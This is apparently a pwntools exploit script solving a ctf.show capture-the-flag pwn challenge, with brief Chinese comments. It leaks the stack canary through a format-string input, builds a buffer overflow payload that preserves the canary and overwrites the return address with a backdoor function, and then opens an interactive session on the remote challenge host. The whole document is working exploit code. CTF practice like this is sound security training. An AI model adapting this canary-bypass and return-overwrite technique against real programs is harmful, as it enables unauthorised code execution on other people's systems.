from pwn import *
context.log_level = 'debug' 
#io = process("./pwn")    
io = remote('pwn.challenge.ctf.show',28182)
elf = ELF('./pwn')
backdoor = elf.sym['qwerasd']
io.recv()
#print Canary
io.sendline("%15$08x")
canary = io.recv()[:8]                  # 获取返回的 Canary ，只取前 8 位，即去掉回⻋符 
Canary = canary.decode("hex")[::-1]    # 将 Canary 转换为⼩端 
    
#Payload
canary_offset = 8*4
ret_offset = 3*4
#Bypass Canary
payload = canary_offset*'a' + Canary + ret_offset*'b' + p32(backdoor) 
io.sendline(payload)
io.interactive()
